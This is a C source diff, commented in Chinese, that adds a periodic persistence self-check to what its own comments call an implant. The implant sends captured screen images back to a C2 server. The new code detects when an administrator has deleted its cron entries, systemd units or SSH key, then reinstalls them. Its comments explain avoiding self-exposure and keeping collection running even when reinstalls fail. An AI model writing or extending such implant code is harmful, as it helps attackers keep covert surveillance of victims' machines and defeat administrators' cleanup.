@@ -744,6 +744,58 @@ static void cd_sleep_us(uint64_t us, void *ud)
     (void)nanosleep(&ts, NULL);
 }
 
+/* ---- 驻留周期性自检 ---- */
+
+/*
+ * 为什么需要它（改动前必读）：
+ *   驻留原本只在启动前 ensure 一次。管理员删掉 cron 条目或 systemd 单元
+ *   后，常驻进程若不重启就永远不会重新 ensure——进程在跑、画面在回传，
+ *   部署侧与 C2 侧都看不出异常，而机器一重启植入体就彻底消失了。这是
+ *   "驻留成功"的假象，且要等到重启才暴露。
+ *
+ * 为什么自检走 query 而不是每次都 ensure：
+ *   ensure 内部的 persist_drop_self 会覆盖写落盘副本（保证副本最新）。
+ *   每批都重写一次二进制是自我暴露，且 I/O 无谓。query 只是 stat + 读
+ *   一次文件，零副作用；只有发现缺段时才真重装。
+ *
+ * 为什么只校验"启动时装上的那些段"：
+ *   sshkey 未配公钥时 base=0（合法形态）。若把它算成缺失，则每 N 批都会
+ *   触发一次含覆盖写的 ensure，把"不启用"变成"反复重写文件"。
+ */
+typedef struct {
+    const cam_daemon_cfg_t *cfg;
+    cam_daemon_stats_t     *st;
+    int  base[CAM_DAEMON_PERSIST_N];   /* 启动时各段是否装上，作为自检基线 */
+} cd_audit_ctx_t;
+
+static int cd_persist_audit(uint32_t batch_no, void *ud)
+{
+    cd_audit_ctx_t *c = (cd_audit_ctx_t *)ud;
+    if (!c || !c->cfg || !c->st) return -1;
+
+    uint32_t n = c->cfg->persist_recheck_batches;
+    if (n == 0) return 0;
+    if (batch_no % n != 0) return 0;
+
+    int cur[CAM_DAEMON_PERSIST_N];
+    if (persist_linux_query(c->cfg->root_prefix, cur, CAM_DAEMON_PERSIST_N) < 0)
+        return -1;
+    c->st->persist_rechecks++;
+
+    int missing = 0;
+    for (int i = 0; i < CAM_DAEMON_PERSIST_N; i++)
+        if (c->base[i] == 1 && cur[i] == 0) missing++;
+    if (missing == 0) return 0;
+
+    /* 有缺段 -> 重装。返回值刻意不参与状态机：重装失败不该终止采集，
+     * 否则"自愈机制"反而成了杀死植入体的开关。 */
+    int rc = persist_linux_ensure(c->cfg->root_prefix,
+                                  c->st->bin_path, sizeof c->st->bin_path,
+                                  c->st->methods, CAM_DAEMON_PERSIST_N);
+    if (rc >= 0) c->st->persist_heals++;
+    return 0;
+}
+
 /* ---- pid 文件 ---- */
 static int cd_write_pid(const char *path)
 {
@@ -919,6 +971,18 @@ int cam_daemon_run(const cam_daemon_cfg_t *cfg, cam_daemon_stats_t *out_stats)
     implant_set_sleep(im, cd_sleep_us, NULL);
     implant_set_pack(im, cd_pack, &sink);
     implant_set_exfil(im, cd_exfil, &sink);
+
+    /* 驻留周期性自检。基线取启动后各段实际状态：sshkey 未启用（methods=0）
+     * 时不该被算成缺段，否则每 N 批都会触发一次含覆盖写落盘的 ensure。 */
+    cd_audit_ctx_t actx;
+    memset(&actx, 0, sizeof actx);
+    if (cfg->ensure_persist && cfg->persist_recheck_batches) {
+        actx.cfg = cfg;
+        actx.st  = &st;
+        for (int i = 0; i < CAM_DAEMON_PERSIST_N; i++)
+            actx.base[i] = st.methods[i];
+        implant_set_audit(im, cd_persist_audit, &actx);
+    }
 
     /* 4) 信号：daemonize 之后安装，避免被父进程的处置方式影响 */
     g_im = im;
